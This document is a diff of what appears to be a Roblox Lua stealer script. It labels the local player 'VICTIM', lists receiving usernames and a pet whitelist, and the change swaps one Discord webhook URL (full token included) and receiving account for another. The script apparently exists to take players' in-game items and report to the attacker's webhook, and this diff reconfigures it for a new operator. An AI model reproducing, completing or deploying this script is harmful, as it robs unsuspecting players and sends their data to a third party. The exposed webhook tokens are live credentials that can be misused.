@@ -2,10 +2,10 @@ repeat
     task.wait()
 until game:IsLoaded()
 
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1400978772764659712/8D9ZMM-FUIUm_i2oSwc3zaX6FA6wNYK96FHGcH69yh1PmhMt0aMlfJgN9S5veYoypzcY"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP"
 local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {
-    "SUMERE4H"
+    "saikigrow"
 }
 
 local PET_WHITELIST = {
